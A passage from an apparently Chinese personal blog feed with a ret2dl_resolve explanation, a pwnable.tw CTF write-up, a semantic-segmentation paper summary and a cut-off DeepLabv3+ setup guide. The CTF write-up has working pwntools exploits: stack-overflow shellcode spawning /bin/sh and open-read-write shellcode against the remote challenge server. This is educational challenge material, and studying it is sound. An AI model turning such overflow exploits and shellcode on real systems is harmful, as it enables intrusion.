alt="system_call"></p><p>这里需要特别提到如何在栈中正确的布置函数和参数的位置</p><ul><li>在32位的程序中，栈里面一个函数地址后面紧跟着的就是程序执行之后的返回地址，然后再依次存放函数的参数</li><li>在64位的程序中也会遵循同样的规则，但是函数的参数将会先放在寄存器RDI,RSI,RDX,RCX,R8,R9等当中，直到第7个参数才会放入栈中</li></ul><h3 id="ret2-dl"><a href="#ret2-dl" class="headerlink" title="ret2_dl"></a>ret2_dl</h3><h4 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h4><p>当第一次调用某一个函数时会调用本函数，并执行如下过程:</p><p><code>_dl_runtime_resolve(link_map_obj, reloc_index)</code></p><ol><li>首先用link_map访问.dynamic, 分别取出.dynstr  .dynsym  .rel.plt的地址</li><li>.rel.plt + 参数reloc_index,求出当前函数的重定位表项Els32_Rel指针，记作rel</li><li>rel-&gt;r_info &gt;&gt; 8&#x3D;n作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym</li><li>.dynstr + sym-&gt;st_name得出符号名字字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋给*rel-&gt;r_offset，即GOT表</li><li>调用函数</li></ol><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><ol><li>伪造字符串表，使得符号对应的名称被我们控制</li><li>伪造符号表，指向伪造的字符串表</li><li>伪造重定位表项，使得重定位表项所指的符号指向伪造的符号表</li><li>控制reloc_index的大小，将重定位表项指向伪造的重定位表</li><li>给定_dl_runtime_resolve函数的参数link_map_obj和reloc_index</li></ol><p>攻击成功的原因主要有二:</p><ol><li>_dl_runtime_resolve函数不会检查对应的符号是否越界，只会根据参数link_map和reloc_index来执行</li><li>_dl_runtime_resolve函数的对链接的函数依赖于给定的字符串</li></ol><p><img src="https://image.0error.net/img/2022/20220923202521.png" alt="attack_method"></p><p>具体计算方法:</p><ul><li>n&#x3D;fake_rel_plt_addr - .rel.plt_addr</li><li>r_info&#x3D;((fake_dynsym_addr)&#x2F; 0x10)&lt;&lt;8 + 0x7</li><li>name_offset&#x3D;fake_dynstr_addr - .dynstr_addr</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stackoverflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable_tw笔记</title>
      <link href="/2022/09/51647.html"/>
      <url>/2022/09/51647.html</url>
      
        <content type="html"><![CDATA[<h1 id="Pwnable-tw笔记"><a href="#Pwnable-tw笔记" class="headerlink" title="Pwnable_tw笔记"></a>Pwnable_tw笔记</h1><p>pwnable开坑了，希望自己能把这个大坑补完，近期和学长交流了一下，受益颇多，也深深感受到了自己水平上的差距，再次清醒认识到自己是蒟蒻(，所以遵从勤能补拙的思路，希望通过多积累和见识题目真正在System方面有所深入</p><h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>拿到手先赶紧进行一个checksec</p><p><img src="https://image.0error.net/img/2022/20220917201655.png"></p><p>这里推荐最好用多个工具检查一番，因为看网上有人说peda检测此程序会提示开了NX，实则没有，这样会让做题人徒增烦恼 :thinking:</p><blockquote><p><strong>RELRO(Relocation Read Only)：尽量使存储区域只读</strong></p></blockquote><p>接着进行一个IDA的分析</p><p><img src="https://image.0error.net/img/2022/20220917202057.png"></p><p>这里可以看到使用了int80方式的系统函数调用方法</p><blockquote><h3 id="INT-80h-系统调用方法"><a href="#INT-80h-系统调用方法" class="headerlink" title="INT 80h 系统调用方法"></a><strong>INT 80h 系统调用方法</strong></h3><p><strong>系统调用的过程</strong>可以总结如下：<br>1． 执行用户程序(如:fork)<br>2． 根据glibc中的函数实现，取得系统调用号并执行int $0x80产生中断。<br>3． 进行地址空间的转换和堆栈的切换，执行SAVE_ALL。（进行内核模式）<br>4． 进行中断处理，根据系统调用表调用内核函数。<br>5． 执行内核函数。<br>6． 执行RESTORE_ALL并返回用户模式<br>Linux 32位的系统调用时通过int 80h来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数。</p></blockquote><p>其中int80调用的系统函数编号可以在<a href="http://faculty.nps.edu/cseagle/assembly/sys_call.html">网络上找到</a></p><p>其中第一个系统调用为将esp(赋给ecx执行)开始的0x14H字节数据写入标准输出，即最终输出<code>Let&#39;s start the CTF.</code></p><table><thead><tr><th>name</th><th>eax</th><th>ebx</th><th>ecx</th><th>edx</th></tr></thead><tbody><tr><td><a href="https://man7.org/linux/man-pages/man2/write.2.html">sys_write</a></td><td>0x04</td><td>unsigned int fd &#x3D; 1</td><td>const char __user *buf &#x3D; esp</td><td>size_t count&#x3D;14H</td></tr></tbody></table><p>第二个系统调用则是从标准输入读取0x3cH字节到栈空间，这里义眼顶针，鉴定为可能可以溢出</p><table><thead><tr><th>name</th><th>eax</th><th>ebx</th><th>ecx</th><th>edx</th></tr></thead><tbody><tr><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html">sys_read</a></td><td>0x03</td><td>unsigned int fd&#x3D;1</td><td>char __user *buf&#x3D;esp</td><td>size_t count&#x3D;3ch</td></tr></tbody></table><p>现在我们知道了读入应当使用的是<code>read(1,esp,0x3c)</code>，那么下一步就是要找到esp在哪了，通过最后一部分的<code>add esp,14h</code>我们推断start函数使用的是<a href="https://blog.csdn.net/boildoctor/article/details/121181152">内平栈</a>，几esp距离ret有0x14个字节。我们可以通过gdb来证明猜想。</p><p><img src="https://image.0error.net/img/2022/20220917203221.png" alt="buf_address"></p><p>在这里我们看到了buf的地址，再看ret</p><p><img src="https://image.0error.net/img/2022/20220917203409.png" alt="ret_address"></p><p><img src="https://image.0error.net/img/2022/20220917203459.png"></p><p>果然就是0x14，所以padding就是<code>&#39;a&#39;*0x14</code>，接下来就是要考虑如何劫持控制流，这里因为保护全没开，所以可以试试ret2shellcode，所以就必须要知道栈的地址，要想泄露栈地址，那么就要考虑使用一下write函数了，当我们在ret的地址填充0x8048089就可以打印出栈的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x8048087</span>)<br></code></pre></td></tr></table></figure><p>read有60B，我们可以使用的有60B-24B&#x3D;36B，所以我们还得去找一个断点的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode=<span class="hljs-string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span><br></code></pre></td></tr></table></figure><p>查看一下其具体作用</p><p><img src="https://image.0error.net/img/2022/20220917204007.png"></p><p>这就是在做系统调用，所以只要我们把对应获取shell的系统调用的参数放在对应寄存器中，然后执行int80，就可以执行对应的系统调用，此处我们利用如下方式来getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, NULL, NULL)<br></code></pre></td></tr></table></figure><p>其中，该程序是 32 位，所以我们需要使得<br>系统调用号，即 eax 应该为 0xb<br>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。为了4字节对齐，我们用&#x2F;&#x2F;bin&#x2F;sh<br>第二个参数，即 ecx 应该为 0<br>第三个参数，即 edx 应该为 0</p><p>这里我们使用<code>xor ecx,ecx</code>来代替原shellcode中的<code>mov ecx,0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor ecx,ecx<br>xor edx,edx<br>push edx ;\截断字符串<br>push 0x68732f6e ; &#x27;n/sh&#x27;<br>push 0x69622f2f ; &#x27;//bi&#x27;<br>mov ebx,esp<br>mov a1,0xb<br>int 0x80<br></code></pre></td></tr></table></figure><p>所以就可以写出如下exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> inspect <span class="hljs-keyword">import</span> stack<br><span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> S<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>contect.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>p=process(<span class="hljs-string">&#x27;./start&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x8048087</span>)<br>p.sendafter(<span class="hljs-string">&quot;Let&#x27;s start the CTF:&quot;</span>, payload)<br>stack_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;stack_addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(stack_addr)<br><br>shellcode = asm(<span class="hljs-string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov al,0xb;int 0x80&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(stack_addr+<span class="hljs-number">0x14</span>)+shellcode<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>成功getshell，最后find一下flag提交即可，大功告成</p><p><img src="https://image.0error.net/img/2022/20220917200933.png" alt="start_success"></p><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>拿到手这次吸取上个题的经验，先进行一个checksec</p><p><img src="https://image.0error.net/img/202220220918222500.png"></p><p>彳亍，看来pwnable确实对新手最友好，那就继续拖入IDA进行分析</p><p><img src="https://image.0error.net/img/202220220918222957.png"></p><p>看到了<code>orw_seccmop()</code>函数，进入查看是关于系统内部的调用<code>prctl</code>的进程创建和管理内容，不太理解含义，遂Google之，发现是关于沙箱保护的函数，通过这一函数可以划定程序准许用户态调用的系统函数，相当于划定白名单，即题目所言仅开启了open、write、read。这里我们可以用seccomp查看其保护规则。</p><p><img src="https://image.0error.net/img/202220220918223823.png"></p><p>通过分析可知，本题是直接执行了用户remote传来的shellcode，但是通过沙箱机制只授予了write, read, open权限，所以我们需要通过这三个操作获取到flag的值，而flag具体位置在题目里面已经给出了。结合题目意思，可以使用open函数打开flag文件，然后read读出文件内容，最后write输出到控制台。</p><p>后面的思路就很简单了，我们只需要调用其open-read-write过程读取出<code>/home/orw/flag</code>下的内容并输出即可，这里有两种方式解决。</p><h3 id="0x01-shellcraft一把梭"><a href="#0x01-shellcraft一把梭" class="headerlink" title="0x01. shellcraft一把梭"></a>0x01. shellcraft一把梭</h3><p>shellcraft是一种自动化生成shellcode的工具，只需要你了解pwn的过程和方法，可以大部分避开手搓汇编的过程，放到这个题目里面个人猜测出题人也是想要通过这个方式来解决，因为本题flag路径以及getshell方式已经很明确了（o-r-w），所以我们废话少说，立马开始写shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>p=remote(<span class="hljs-string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="hljs-number">10001</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br><br>s= <span class="hljs-string">&#x27;&#x27;</span><br>s+=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/orw/flag&quot;</span>)<br>s+=shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;ebp&#x27;</span>,<span class="hljs-number">0x100</span>)<br>s+=shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;ebp&#x27;</span>,<span class="hljs-number">0x100</span>)<br>s+= <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">\nnext:</span><br><span class="hljs-string">jmp next&#x27;&#x27;&#x27;</span><br>p.send(asm(s))<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://image.0error.net/img/2022/20220919143530.png"></p><p>这样就可以直接getshell</p><h3 id="0x02-手搓汇编"><a href="#0x02-手搓汇编" class="headerlink" title="0x02. 手搓汇编"></a>0x02. 手搓汇编</h3><p>鉴于MTCTF因为汇编不熟造成的惨痛经历，个人认为汇编基础还是要牢牢把握，刚好看到也有师傅手搓的WP，遂计划照猫画虎，自己也学习一下。</p><p>我们选择x86 syscall构造出 <code>open</code> <code>read</code> <code>write</code></p><ul><li><pre><code class="hljs">open(file=&#39;esp&#39;, oflag=&#39;O_RDONLY&#39;, mode=0)<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>  - 这里可以直接用pwntools给出的写法<br><br>- ```<br>  <span class="hljs-built_in">read</span>(fd, buf, <span class="hljs-built_in">length</span>)<br></code></pre></td></tr></table></figure>- `eax` 是 0x3- `fd` 存在 `open()` 的回传結果 (`eax`)- `buf` 在 `esp`- `length` 为 60，任意数值，能够覆盖flag即可</code></pre></li><li><p>&#96;&#96;&#96;<br>write(stdout, buf, length)</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br>  - <span class="hljs-string">`eax`</span> 是 <span class="hljs-number">0x4</span><br>  - <span class="hljs-string">`stdout`</span> 是 <span class="hljs-number">1</span><br>  - <span class="hljs-string">`buf`</span> 是刚刚读取的 <span class="hljs-string">`esp`</span><br>  - <span class="hljs-string">`length`</span> 是 <span class="hljs-number">60</span>，参照read的length<br><br>可以得出的汇编代码如下<br><br><span class="hljs-string">```</span>assembly<br>/* <span class="hljs-keyword">push</span> <span class="hljs-string">&#x27;/home/orw/flag\x00&#x27;</span> */<br>        <span class="hljs-keyword">push</span> <span class="hljs-number">0x1010101</span><br>        <span class="hljs-keyword">xor</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], <span class="hljs-number">0x1016660</span><br>        <span class="hljs-keyword">push</span> <span class="hljs-number">0x6c662f77</span><br>        <span class="hljs-keyword">push</span> <span class="hljs-number">0x726f2f65</span><br>        <span class="hljs-keyword">push</span> <span class="hljs-number">0x6d6f682f</span><br>/* open(file=<span class="hljs-string">&#x27;esp&#x27;</span>, oflag=<span class="hljs-string">&#x27;O_RDONLY&#x27;</span>, mode=<span class="hljs-number">0</span>) */<br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">esp</span><br>        <span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br>        <span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span><br>/* <span class="hljs-keyword">call</span> open() */<br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0x5</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><span class="hljs-comment">;</span><br>/*<span class="hljs-keyword">call</span> read()*/<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">eax</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0x3</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">esp</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>,<span class="hljs-number">0x30</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><span class="hljs-comment">;</span><br>/*<span class="hljs-keyword">call</span> write()*/<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0x4</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>,<span class="hljs-number">1</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>,<span class="hljs-number">0x30</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>p=remote(<span class="hljs-string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="hljs-number">10001</span>)<br><span class="hljs-comment">#p=process(&#x27;./start&#x27;)</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(<span class="hljs-string">&#x27;ag&#x27;</span>+<span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>)))+<span class="hljs-built_in">hex</span>(u32(<span class="hljs-string">&#x27;w/fl&#x27;</span>))+<span class="hljs-built_in">hex</span>(u32(<span class="hljs-string">&#x27;e/or&#x27;</span>))+<span class="hljs-built_in">hex</span>(u32(<span class="hljs-string">&#x27;/hom&#x27;</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x1010101;</span><br><span class="hljs-string">xor dword ptr [esp], 0x1016660;</span><br><span class="hljs-string">push 0x6c662f77;</span><br><span class="hljs-string">push 0x726f2f65;</span><br><span class="hljs-string">push 0x6d6f682f;</span><br><span class="hljs-string">mov ebx,esp;</span><br><span class="hljs-string">xor ecx,ecx;</span><br><span class="hljs-string">xor edx,edx;</span><br><span class="hljs-string">xor eax,eax;</span><br><span class="hljs-string">mov al,0x5;</span><br><span class="hljs-string">int 0x80;</span><br><span class="hljs-string">mov ebx,eax;</span><br><span class="hljs-string">xor eax,eax;</span><br><span class="hljs-string">mov al,0x3;</span><br><span class="hljs-string">mov ecx,esp;</span><br><span class="hljs-string">mov dl,0x30;</span><br><span class="hljs-string">int 0x80;</span><br><span class="hljs-string">mov al,0x4;</span><br><span class="hljs-string">mov bl,1;</span><br><span class="hljs-string">mov dl,0x30;</span><br><span class="hljs-string">int 0x80;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment">#payload = &#x27;a&#x27;*0x14 + p32(stack_addr+0x14)+shellcode</span><br>p.send(asm(shellcode))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>也可得出最终结果</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文总结-语义分割经典模型</title>
      <link href="/2022/09/46066.html"/>
      <url>/2022/09/46066.html</url>
      
        <content type="html"><![CDATA[<p>语义分割<strong>是图像分割中的基本任务，是指</strong>对于图像将每个像素都标注上对应的类别，不区分个体**。简单地说，我们需要将视觉输入的数据分为不同的语义可解释性类别。若是区分了个体数量，那么就是实例分割。</p><p>本文主要总结一些较为经典的语义分割模型，慢慢更新，主要是对U-Net、FCN、SegNet、PSPNet、DeepLab v1&#x2F;v2&#x2F;v3&#x2F;v3+进行要点概括，论文的具体解读、链接和源码在每个标题之后。</p><h1 id="U-Net"><a href="#U-Net" class="headerlink" title="U-Net"></a>U-Net</h1><p>[<a href="https://zhuanlan.zhihu.com/p/98339195">论文笔记] U-Net - 知乎 (zhihu.com)</a></p><ol><li><p>U-Net发表于<strong>2015年</strong>，用于医学细胞分割</p></li><li><p>编码器-解码器架构，四次下采样（maxpooling），四次上采样（转置卷积），形成了U型结构</p></li><li><p>U-Net最核心的一个思想是<strong>特征图的拼接</strong></p></li><li><p>SGD+Momentum，损失函数为交叉熵</p></li><li><p>数据预处理使用了镜像边缘，可以更好细化边界信息</p></li><li><p>数据增加中有一个弹性形变，符合细胞本身的特性</p></li><li><p>可以应对小样本的数据集进行较快、有效地分割，能够泛化到很多应用场景中去</p><p><img src="https://image.0error.net/img/2022/20220514193722.png" alt="img"></p></li></ol><h1 id="FCN：Fully-Convolutional-Networks"><a href="#FCN：Fully-Convolutional-Networks" class="headerlink" title="FCN：Fully Convolutional Networks"></a>FCN：Fully Convolutional Networks</h1><p>[<a href="https://zhuanlan.zhihu.com/p/113250925">论文笔记] FCN：Fully Convolutional Networks - 知乎 (zhihu.com)</a></p><ol><li>FCN发布于<strong>2014年</strong>，是语义分割领域全卷积网络的<strong>开山之作</strong>，U-Net也在其之后</li><li>其主要思路是将图像分类的网络改良成语义分割的网络，通过将分类器（全连接层）变成上采样层来恢复特征图的尺寸，进行端到端训练</li><li>分类器变成上采样，这部分思想作者主要的解释是全连接层是一种特殊的卷积</li><li>选择了AlexNet、GoogLeNet和VGG作为backbone（主干网络），<strong>VGG效果最好，但是推理最慢</strong></li><li>最核心的思想是<strong>特征图的融合</strong>：假设最后的输出为pool5产生的x，利用转置卷积上采样，放大32倍，得到FCN-32s；将x上采样放大2倍，和pool4产生的特征图直接相加，再上采样放大16倍，得到FCN-16s；将FCN-16s进行上采样放大2倍，与pool3产生的特征图直接相加，在放大8倍，得到FCN-8s。在实验中，FCN-8s的效果最好</li><li>backbone是分类网络，下采样都是maxpooling，上采样使用的是双线性插值初始化的转置卷积</li><li>在PASCAL VOC 2012上达到了**62.2%**的mIoU</li></ol><p><img src="https://image.0error.net/img/2022/20220514193943.png" alt="FCN"></p><h1 id="SegNet：A-Deep-Convolutional-Encoder-Decoder-Architecture-for-Image-Segmentation"><a href="#SegNet：A-Deep-Convolutional-Encoder-Decoder-Architecture-for-Image-Segmentation" class="headerlink" title="SegNet：A Deep Convolutional Encoder-Decoder Architecture for Image Segmentation"></a>SegNet：A Deep Convolutional Encoder-Decoder Architecture for Image Segmentation</h1><p>[<a href="https://zhuanlan.zhihu.com/p/113347630">论文笔记] SegNet: Encoder-Decoder Architecture - 知乎 (zhihu.com)</a></p><ol><li>SegNet发布于<strong>2015年</strong>，使用编码器-解码器结构</li><li>其backbone是2个VGG16，去掉全连接层（13层），对应形成编码器-解码器架构</li><li>最核心的想法是<strong>提出了maxpool的索引来上采样</strong>的方法，从而免去了学习上采样的需要，在推理阶段节省了内存</li><li>作者说道这个idea是来自于无监督特征学习。在解码器中重新使用编码器池化时的索引下标有这么几个优点：1. 能改善边缘的情况；2. 减少了模型的参数；3. 这种能容易就能整合到任何的编码器-解码器结构中，只需要稍稍改动</li><li>文章采用的数据集是CamVid road scene segmentation 和 SUN RGB-D indoor scene segmentation。之所以不用主流的Pascal VOC12，是因为作者认为VOC12的背景太不相同了，所以可能分割起来比较容易</li><li>总得来说，SegNet的性能比较一般，不如同时期的DeepLab v1，但是因为它只存储特征映射的maxpool索引，所以最推理阶段内存占用少，更为高效</li></ol><p><img src="https://image.0error.net/img/2022/20220514194044.png"></p><h1 id="PSPNet：Pyramid-Scene-Parsing-Network"><a href="#PSPNet：Pyramid-Scene-Parsing-Network" class="headerlink" title="PSPNet：Pyramid Scene Parsing Network"></a>PSPNet：Pyramid Scene Parsing Network</h1><p>[<a href="https://zhuanlan.zhihu.com/p/115004020">论文笔记] PSPNet：Pyramid Scene Parsing Network - 知乎 (zhihu.com)</a></p><ol><li>PSPNet发布于2017年，<strong>CVPR 2017</strong></li><li>核心idea是提出了<strong>金字塔池化模块</strong>，模型带有空洞卷积</li><li><strong>金字塔池化（Pyramid pooling）</strong>融合了四个比例的特征，**结合多尺寸信息：SPP(AVE效果优于MAX)**。最粗糙的 $1x1$是全局尺度的池化，剩下的层次会将图像分为不同子区域，形成不同区域的信息表示。金字塔池模块中不同level的输出包含比例不同的feature map（比如输入的维度都是 $2048$ ，有四个层次的金字塔，那么输出的维度则为 $2048&#x2F;4&#x3D;512$ ）。为了保持全局特征的权重，若如果金字塔的数量为 ，则N在每个金字塔级别之后使用<code>1x1</code>卷积层将上下文表示的维度减小到原先的<code>1/N</code> 。然后直接对feature map进行双线性插值，恢复到输入的长宽上。最后，将不同level的特征拼接起来作为金字塔池化的全局特征。文中给出的金字塔池化模块是一个四级模块，其大小分别为<code>1x1 2x2 3x3 6x6</code> 。</li><li>其backbone为修改Resnet-101 为 ResNet-103，而且有辅助 loss，上采样是双线性插值</li><li>性能上PASCAL VOC 2012：85.4%（pre-trained on COCO），82.6%；Cityscape：80.2% （both coarse and fine set）。</li></ol><p><img src="https://image.0error.net/img/2022/20220514194327.png" alt="PSPNet"></p><h1 id="DeepLab-v3"><a href="#DeepLab-v3" class="headerlink" title="DeepLab v3+"></a>DeepLab v3+</h1><ol><li><strong>CVPR 2018</strong></li><li>和v3的区别是多了一个解码器模块，backbone用了<strong>Aligned Xception</strong>（其中有深度可分解卷积）</li><li>PASCAL VOC 2012达到了<strong>87.8%<strong>的mIOU，在JFT预训练的DeepLab v3+在PASCAL VOC 2012上至今领先，达到了</strong>89.0%<strong>，</strong>但是JFT-300M是谷歌的内部数据集，不开源</strong></li></ol><p><img src="https://image.0error.net/img/2022/20220514194436.png" alt="deeplabv3+"></p><p>[<a href="https://zhuanlan.zhihu.com/p/126567709">论文笔记] DeepLab v3+ - 知乎 (zhihu.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> 语义分割 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DeepLabv3+语义分割实例记录-路坑标注</title>
      <link href="/2022/04/d2c1a00.html"/>
      <url>/2022/04/d2c1a00.html</url>
      
        <content type="html"><![CDATA[<h1 id="本文默认"><a href="#本文默认" class="headerlink" title="本文默认"></a>本文默认</h1><ul><li>已经装配好了anaconda</li><li>拥有NVDIA支持进行GPU运算的显卡以及正确装配的驱动</li><li>已配置好了代理以及下载加速</li><li>操作环境为Windows 11+Kali Linux(WSL2)</li></ul><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><p>首先创建一个anaconda的虚拟环境，进入<code>Anconda Prompt</code>，这里我就用pytorch作为环境名，python3.8为必须选项（网上大部分描写的3.6版本python现在已经不受支持，使用最新环境中会遇到诸多问题）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">conda create -n pytorch python=3.8<br></code></pre></td></tr></table></figure><p>安装成功后激活环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">conda activate 